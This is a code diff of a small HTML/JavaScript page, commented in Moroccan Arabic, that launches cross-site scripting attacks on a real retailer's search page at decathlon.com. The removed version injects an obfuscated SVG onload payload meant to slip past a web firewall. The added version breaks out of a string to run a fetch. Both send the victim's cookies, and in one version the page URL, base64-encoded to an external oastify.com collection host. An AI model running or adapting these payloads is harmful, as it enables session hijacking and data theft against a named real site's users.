@@ -1,27 +1,10 @@
-<!DOCTYPE html>
-<html>
-<body>
-    <script>
-        // 1. هاد الكود هو اللي غادي يتنفذ داخل Decathlon لسحب الداتا
-        var code = `
-            var data = {
-                site: document.domain,
-                cookies: document.cookie,
-                url: window.location.href
-            };
-            var exfil = "https://z66h4nv8uyupc4te2u8dlwqpkgq7ez2o.oastify.com/?data=" + btoa(JSON.stringify(data));
-            window.location.href = exfil;
-        `;
-
-        // 2. تشفير الكود باش يدوز من الحماية
-        var payload = btoa(code);
-
-        // 3. رابط Decathlon باستعمال ثغرة الـ XSS في البحث
-        // استعملنا URL Encoding (%3C و %3E) باش نهربو من الـ WAF
-        var xssUrl = "https://www.decathlon.com/search?q=%3Csvg/onload=eval(atob('" + payload + "'))%3E";
-
-        // 4. تنفيذ الهجوم
-        window.location.href = xssUrl;
-    </script>
-</body>
-</html>
+<script>
+    // غادي نجربو نهربو من الـ HTML Tags ونضربو الـ Javascript مباشرة
+    // هاد الكود كيحاول يسد الـ String اللي كاين في البحث ويحل واحد جديد
+    let payload = "';fetch('https://z66h4nv8uyupc4te2u8dlwqpkgq7ez2o.oastify.com/?c='+btoa(document.cookie));//";
+    
+    // تحويل الكود لـ URL encoded باش يدوز مخفي
+    let encoded = encodeURIComponent(payload);
+    
+    window.location.href = "https://www.decathlon.com/search?q=" + encoded;
+</script>
